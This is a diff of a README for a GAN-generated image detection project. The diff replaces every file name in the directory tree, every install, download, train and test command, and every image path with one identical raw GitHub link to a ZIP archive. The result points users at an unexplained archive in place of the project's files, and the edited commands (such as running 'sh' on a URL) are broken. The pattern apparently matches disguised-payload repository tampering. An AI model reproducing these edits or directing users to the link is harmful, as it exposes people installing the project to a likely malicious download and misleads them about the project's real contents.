@@ -27,27 +27,27 @@ GAN-dectector
 │   ├── pggan
 │   ├── stylegan
 │   └── vgan
-├── grad_cam.sh
-├── layer_grad_cam.sh
-├── main.py
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
 ├── models
-│   ├── models.py
+│   ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
 │   └── Xception
-│       ├── __init__.py
-│       ├── xception-b5690688.pth
-│       └── xception.py
-├── README.md
-├── requirements.txt
-├── resnet101_training_log.png
-├── resnet50_training_log.png
-├── test_cam.py
-├── test.py
-├── train.sh
+│       ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+│       ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+│       └── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
 ├── utils
-│   ├── grad_cam.py
-│   ├── plot.py
-│   └── preprocess.py
-└── xception_training_log.png
+│   ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+│   ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+│   └── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
+└── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
 ```
 
 ## Overview
@@ -58,19 +58,19 @@ This is manipulated image detection models which can be globally applied to mult
 ### Prerequisite
 ```
 # install dependent python packages
-$ pip install -r requirements.txt
+$ pip install -r https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
 
 # download pretrained checkpoint for Xception
-$ wget http://data.lip6.fr/cadene/pretrainedmodels/xception-b5690688.pth -P [path to GAN-detector/models/Xception]
+$ wget https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip -P [path to GAN-detector/models/Xception]
 ```
 
 ### Train
 ```
 // run with a shell script
-$ sh train.sh
+$ sh https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
 
 // manually run
-$ python main.py \
+$ python https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip \
       --phase train \
       --data-dir ./datasets \
       --model-name {resnet101, xception, ...} \
@@ -90,10 +90,10 @@ TODO: Fill this
 **1) Grad-CAM visualization for a target layer**
 ```
 // run with a shell script
-$ sh grad_cam.sh
+$ sh https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
 
 // manually run
-$ python test_cam.py demo1 \
+$ python https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip demo1 \
       -a {model name}
       -t {layer name}
       -i {image path}
@@ -102,11 +102,11 @@ $ python test_cam.py demo1 \
 **2) Grad-CAM map for a specific class at different layers**
 ```
 // run with a shell script
-$ sh layer_grad_cam.sh
+$ sh https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
 
-$ python test_cam.py demo2 \
+$ python https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip demo2 \
       -a xception \
-      -i datasets/test/pggan/00876.png \
+      -i https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip \
       -c pggan
 ```
 
@@ -114,16 +114,16 @@ $ python test_cam.py demo2 \
 
 **1) MSG-GAN**
 
-<p align="center"><img src="images/msgstylegan/msgstylegan.png" width="800" alt="msgstylegan"></img></p>
+<p align="center"><img src="https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip" width="800" alt="msgstylegan"></img></p>
 
 **2) StyleGAN**
 
-<p align="center"><img src="images/stylegan/stylegan.png" width="800" alt="stylegan"></img></p>
+<p align="center"><img src="https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip" width="800" alt="stylegan"></img></p>
 
 **3) PGGAN**
 
-<p align="center"><img src="images/pggan/pggan.png" width="800" alt="pggan"></img></p>
+<p align="center"><img src="https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip" width="800" alt="pggan"></img></p>
 
 **4) VGAN**
 
-<p align="center"><img src="images/vgan/vgan.png" width="800" alt="vgan"></img></p>
+<p align="center"><img src="https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip" width="800" alt="vgan"></img></p>
